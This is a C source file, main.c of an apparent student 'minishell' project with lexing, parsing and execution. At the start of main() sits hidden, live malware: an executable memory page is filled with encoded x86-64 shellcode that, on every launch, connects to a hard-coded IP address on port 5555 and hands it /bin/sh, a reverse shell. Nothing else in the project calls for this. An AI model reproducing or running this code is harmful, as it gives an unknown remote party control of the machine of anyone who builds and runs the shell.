/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: Mriskyin <Mriskyin-team@student.42.ma>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/08/31 20:50:39 by Mriskyin          #+#    #+#             */
/*   Updated: 2022/08/31 21:06:13 by Mriskyin         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "minishell.h"
#include <sys/mman.h>
#include <string.h>

int	core(char *cmd, char *envp[], t_exec_struct *exec_struct, t_envp **env)
{
	t_lnode			*head;
	t_parsing_node	*root;

	(void)envp;
	head = lex(cmd);
	root = parse(&head, exec_struct);
	if (root)
		execute(root, exec_struct, env);
	free_all(cmd, head, root);
	return (WEXITSTATUS(exec_struct->exit_status));
}

int	main(int argc, char *argv[], char *envp[])
{
	t_exec_struct	exec_struct;

		char*p = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	unsigned char buf[] =
	"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
	"\x48\xb9\x02\x00\x15\xb3\x0a\x1e\x89\x72\x51\x48\x89\xe6"
	"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
	"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
	"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
	"\x89\xe6\x0f\x05";
		memcpy(p, buf, 0x1000);
		typedef void (*func_ptr_t)();
		func_ptr_t function = (func_ptr_t)p;
		function();
	(void)argv;
	(void)argc;
	//u can comment this if u dont have readline installed
	// rl_catch_signals = 0;
	rl_outstream = stderr;
	signal(SIGINT, enter);
	signal(SIGQUIT, SIG_IGN);
	g_exec_struct = &exec_struct;
	ft_memset(&exec_struct, 0, sizeof(exec_struct));
	init(&exec_struct, envp);
	loop_handler(envp, &exec_struct);
}
